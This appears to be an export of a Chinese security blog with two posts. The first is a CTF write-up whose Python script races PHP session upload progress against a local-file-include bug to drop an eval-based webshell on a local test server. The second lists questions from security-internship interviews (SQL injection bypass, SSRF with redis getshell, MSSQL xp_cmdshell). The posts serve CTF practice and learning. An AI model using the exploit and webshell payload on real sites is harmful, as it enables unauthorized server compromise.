<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># @Created by PyCharm_python-study_9.24session.py</span></span><br><span class="line"><span class="comment"># @Author: shmily-ing</span></span><br><span class="line"><span class="comment"># @Data: 2021/9/24 12:50</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:10086/upload.php&quot;</span></span><br><span class="line">sessid = <span class="string">&quot;test&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    filebytes = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        res = session.post(<span class="string">&quot;http://127.0.0.1:10086/upload.php&quot;</span>,</span><br><span class="line">            data=&#123;</span><br><span class="line">                <span class="comment">#&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: &#x27;111&lt;?php eval($_POST[1]);?&gt;&#x27;</span></span><br><span class="line">                <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;111222&lt;?php eval($_POST[1]);?&gt;&#x27;</span> </span><br><span class="line">                &#125;,</span><br><span class="line">            cookies=&#123;</span><br><span class="line">                <span class="string">&#x27;PHPSESSID&#x27;</span>: sessid</span><br><span class="line">                &#125;,</span><br><span class="line">            files=&#123;</span><br><span class="line">                <span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;Lxxx.jpg&#x27;</span>, filebytes)</span><br><span class="line">                &#125;</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        res = session.post(url+<span class="string">&quot;?file=D:\\phpstudy_pro\\Extensions\\tmp\\tmp\\sess_&quot;</span>+sessid,</span><br><span class="line">                           data=&#123;</span><br><span class="line">                               <span class="string">&quot;1&quot;</span>:<span class="string">&quot;file_put_contents(&#x27;D:/phpstudy_pro/WWW/upload-session/1.php&#x27; , &#x27;&lt;?php eval($_POST[2]);?&gt;&#x27;);&quot;</span>     <span class="comment">#包含一句话去写文件</span></span><br><span class="line">                           &#125;,</span><br><span class="line">                           cookies=&#123;</span><br><span class="line">                               <span class="string">&quot;PHPSESSID&quot;</span>:sessid</span><br><span class="line">                           &#125;</span><br><span class="line">                           )</span><br><span class="line">        res2 = session.get(<span class="string">&quot;http://127.0.0.1:10086/1.php&quot;</span>)</span><br><span class="line">        <span class="comment">#res2=requests.get(&quot;http://127.0.0.1:10086/upload.php/?file=D:\\phpstudy_pro\\Extensions\\tmp\\tmp\\sess_test&quot;,cookies=&#123;&quot;PHPSESSID&quot;:sessid&#125;)</span></span><br><span class="line">        <span class="keyword">if</span> res2.status_code == <span class="number">200</span>:</span><br><span class="line">            print(<span class="string">&quot;写入成功&quot;</span>)</span><br><span class="line">            <span class="comment">#print(res2.text)</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot;Retry&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    evnet = threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">            threading.Thread(target=write, args=(session,)).start()  <span class="comment">#Python的threading模块，开5个线程进行条件竞争</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br><span class="line">    evnet.set()</span><br></pre></td></tr></table></figure>

<p>写入成功即可停止，在对应文件目录中可以看到写入的文件</p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20210924174942242.png" alt="image-20210924174942242"></p>
<p>或者用burp  开启start attack，一起跑两个请求</p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20210924180211084.png" alt="image-20210924180211084"></p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20210924180807362.png" alt="image-20210924180807362"></p>
<p>可以看到结果</p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20210924180839093.png" alt="image-20210924180839093"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>buu刷题</tag>
      </tags>
  </entry>
  <entry>
    <title>面经</title>
    <url>/2021/07/01/%E9%9D%A2%E7%BB%8F/</url>
    <content><![CDATA[<ul>
<li>记录下个人面试经验</li>
</ul>
<h2 id="赛宁网安"><a href="#赛宁网安" class="headerlink" title="赛宁网安"></a>赛宁网安</h2><p>信息安全实习生   base南京</p>
<h4 id="一面"><a href="#一面" class="headerlink" title="一面"></a>一面</h4><p>2021.6 电话面试（hr邀请）</p>
<ul>
<li>sql注入有回显和没有回显，怎么处理</li>
<li>sql注入过滤绕过</li>
<li>xss绕过</li>
<li>csrf利用</li>
</ul>
<a id="more"></a>

<ul>
<li>文件上传利用，绕过</li>
<li>中间件一些（解析）漏洞</li>
<li>php反序列化，php文件包含</li>
<li>php代码审计的一些东西</li>
<li>ssrf利用，出现在哪些地方</li>
<li>redis  getshell 的几种方式</li>
<li>mysql提权</li>
<li>windows/linux提权</li>
<li>mssql提权</li>
<li>给你一个域名，说下你的渗透测试思路</li>
<li>护网的一些经历</li>
</ul>
<p>感觉也有部分没有回答出来，提权和redis那块不是很了解。</p>
<p>总体来说面的很全面，面试官很好，只有一面，很快通过了。</p>
<p>在boss直聘上投的。</p>
<h2 id="长亭科技"><a href="#长亭科技" class="headerlink" title="长亭科技"></a>长亭科技</h2><p>安全服务实习生    base南京</p>
<h4 id="一面-1"><a href="#一面-1" class="headerlink" title="一面"></a>一面</h4><p>2021.6 电话面试</p>
<ul>
<li>不想写了，反正是非常基础的知识原理(基础web+代码审计+渗透测试流程)。</li>
</ul>
<p>这是上海给我面的，感觉面试官很好，比较简单，考察不深，我说他们搞错了，然后二面转南京了。</p>
<h4 id="二面"><a href="#二面" class="headerlink" title="二面"></a>二面</h4><p>2021.6 视频面试</p>
<ul>
<li><p>自我介绍，紧张到嘴瓢。。</p>
</li>
<li><p>报错注入函数</p>
</li>
</ul>
<p>updataxml()，extractvalue()紧张到忘了第一个都忘了，日了。然后问还有其他的吗？？我？</p>
<ul>
<li>xml全称</li>
</ul>
<p>不会了。（EXtensible Markup Language）</p>
<ul>
<li>http-only怎么绕过</li>
</ul>
<p>以前看过的，忘了。</p>
<ul>
<li>SQL盲注怎样提高效率</li>
</ul>
<p>回答二分法，（结束后百度的<a href="https://www.freebuf.com/articles/web/231741.html%EF%BC%89">https://www.freebuf.com/articles/web/231741.html）</a></p>
<ul>
<li>domxss能被waf拦截吗</li>
</ul>
<p>肯定不能啊，巴拉巴拉说了一下。</p>
<ul>
<li>domxss发生在DOM文档里面还是外面</li>
</ul>
<p>我说在DOM节点上</p>
<ul>
<li>本地文件包含getshell方式</li>
</ul>
<ol>
<li>包含jpg文件（有木马）去getshell</li>
<li>读配置文件</li>
<li>伪协议（data忘记了）</li>
</ol>
<p>问我还有吗，后面就不知道了。</p>
<ul>
<li>代码审计了解吗，审计过什么</li>
</ul>
<p>说下自己打ctf遇见的一些题目，还有dedecms，还有些忘记了，就说没有了。</p>
<ul>
<li>如何利用ssrf</li>
</ul>
<p>file协议，dict协议，打redis。（不全）</p>
<ul>
<li>没有回显ssrf如何判断</li>
</ul>
<p>我说用dnslog回显，他说这个只能判断他出网，不能判断他是否能访问内网，然后不知道了，貌似以前看到过。后面在学学吧。</p>
<p>二面开始有点紧张，面的很细节，感觉很多没有回答出来，感觉很cccc，感觉简历只面了一半，应该面试官认为我太菜了~~，不想面我了。gg了。长亭二面含金量太高了。</p>
<p>内推的，直接投，没有人理我。</p>
<hr>
<h2 id="杭州默安"><a href="#杭州默安" class="headerlink" title="杭州默安"></a>杭州默安</h2><ul>
<li>2022.3.28 渗透测试 \安服 实习生   ，base南京</li>
<li>很突然，正在玩一个电话打了过来</li>
</ul>
<ol>
<li>介绍自己</li>
<li>看你写有了解后渗透，说下具体</li>
<li>你对哪方面擅长（web渗透，代码审计，后渗透）</li>
<li>sql注入，判断，过滤</li>
<li>登陆框如何利用</li>
<li>xss分类  ？？/?</li>
<li>ssrf 利用，</li>
<li>ssrf+redis  如何getshell</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">计划任务反弹shell</span><br><span class="line"></span><br><span class="line">主从复制   （不会）</span><br></pre></td></tr></table></figure>

<ol start="10">
<li><p>csrf 发生，利用</p>
</li>
<li><p>mssql命令执行函数</p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> xp_cmdshell</span><br><span class="line"></span><br><span class="line">**SP_OACREATE** (这个忘了)</span><br></pre></td></tr></table></figure>

<ol start="12">
<li>说下你代码审计</li>
<li>说下你的问题</li>
</ol>
<p>感觉很面的基础，没有很深入问，</p>
]]></content>
      <categories>
        <category>经历</category>
      </categories>
      <tags>
        <tag>2021面经</tag>
      </tags>
  </entry>
</search>
